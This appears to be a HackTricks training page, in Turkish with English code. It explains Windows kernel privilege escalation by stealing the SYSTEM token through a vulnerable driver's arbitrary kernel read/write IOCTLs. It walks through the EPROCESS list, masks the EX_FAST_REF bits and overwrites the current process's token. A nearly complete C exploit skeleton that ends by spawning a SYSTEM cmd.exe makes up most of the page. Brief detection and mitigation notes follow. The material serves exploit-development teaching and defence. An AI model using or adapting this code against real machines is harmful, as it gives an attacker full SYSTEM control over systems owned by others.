# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Eğer bir vulnerable driver bir saldırganın arbitrary kernel read ve/veya write primitiflerine erişim sağlayan bir IOCTL sunuyorsa, NT AUTHORITY\SYSTEM yükseltmesi sıklıkla bir SYSTEM erişim token’ı çalınarak gerçekleştirilebilir. Teknik, bir SYSTEM process’in EPROCESS içindeki Token pointer’ını mevcut process’in EPROCESS’ine kopyalar.

Neden işe yarıyor:
- Her process’in, (diğer alanlar arasında) bir Token (aslında token objesine işaret eden bir EX_FAST_REF) içeren bir EPROCESS yapısı vardır.
- SYSTEM process (PID 4) tüm ayrıcalıkları etkin olan bir token’a sahiptir.
- Mevcut process’in EPROCESS.Token’ını SYSTEM token pointer’ı ile değiştirmek, mevcut process’in hemen SYSTEM olarak çalışmasını sağlar.

> EPROCESS içindeki offset’ler Windows sürümleri arasında değişir. Bunları dinamik olarak (symbols) belirleyin veya sürüme özel sabitler kullanın. Ayrıca EPROCESS.Token’ın bir EX_FAST_REF olduğunu unutmayın (alt 3 bit referans sayacı bayraklarıdır).

## Yüksek seviye adımlar

1) ntoskrnl.exe base’ini bulun ve PsInitialSystemProcess adresini çözün.
- User mode’dan, yüklü driver base’lerini almak için NtQuerySystemInformation(SystemModuleInformation) veya EnumDeviceDrivers kullanın.
- Kernel base’e PsInitialSystemProcess offset’ini (symbols/reversing’den) ekleyerek adresini elde edin.
2) PsInitialSystemProcess’teki pointer’ı okuyun → bu, SYSTEM’in EPROCESS’ine işaret eden bir kernel pointer’ıdır.
3) SYSTEM EPROCESS’inden UniqueProcessId ve ActiveProcessLinks offset’lerini okuyarak EPROCESS yapılarının çift bağlı listesini (ActiveProcessLinks.Flink/Blink) gezin; UniqueProcessId’si GetCurrentProcessId() ile eşit olan EPROCESS’i bulana kadar devam edin. İkisini saklayın:
- EPROCESS_SYSTEM (SYSTEM için)
- EPROCESS_SELF (mevcut process için)
4) SYSTEM token değerini okuyun: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Alt 3 biti maskeleyin: Token_SYS_masked = Token_SYS & ~0xF (genelde ~0xF veya build’e bağlı olarak ~0x7; x64 üzerinde alt 3 bit kullanılır — 0xFFFFFFFFFFFFFFF8 maskesi).
5) Seçenek A (yaygın): Gömülü ref count’ın tutarlı kalması için mevcut token’ınızdaki alt 3 biti koruyup SYSTEM pointer’ına ekleyin.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Kernel write primitive’inizi kullanarak Token_NEW’i (EPROCESS_SELF + TokenOffset) adresine yazın.
7) Mevcut process’iniz artık SYSTEM. Doğrulamak için isteğe bağlı olarak yeni bir cmd.exe veya powershell.exe spawn edin.

## Pseudocode

Aşağıda sadece bir vulnerable driver’dan iki IOCTL kullanan bir iskelet var: biri 8-byte kernel read, diğeri 8-byte kernel write için. Kendi driver arayüzünüzle değiştirin.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notlar:
- Ofsetler: Doğru offsetleri elde etmek için hedefin PDBs'iyle veya bir çalışma zamanı sembol yükleyicisi ile WinDbg’in `dt nt!_EPROCESS` komutunu kullanın. Offs etleri körü körüne sabit değer olarak kullanmayın.
- Maske: x64'te token bir EX_FAST_REF'tir; en düşük 3 bit referans sayacı bitleridir. Tokeninizin orijinal düşük bitlerini korumak, anında referans sayacı tutarsızlıklarını önler.
- Kararlılık: Mevcut işlemi yükseltmeyi tercih edin; kısa ömürlü bir yardımcıyı yükseltirseniz, o sonlandığında SYSTEM yetkisini kaybedebilirsiniz.

## Tespit ve hafifletme
- Güçlü IOCTL'ler açığa çıkaran imzasız veya güvenilmez üçüncü taraf sürücülerin yüklenmesi temel nedendir.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard ve Attack Surface Reduction kuralları savunmasız sürücülerin yüklenmesini engelleyebilir.
- EDR, arbitrary read/write uygulayan şüpheli IOCTL dizilerini ve token swaps için izleme yapabilir.

## Referanslar
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
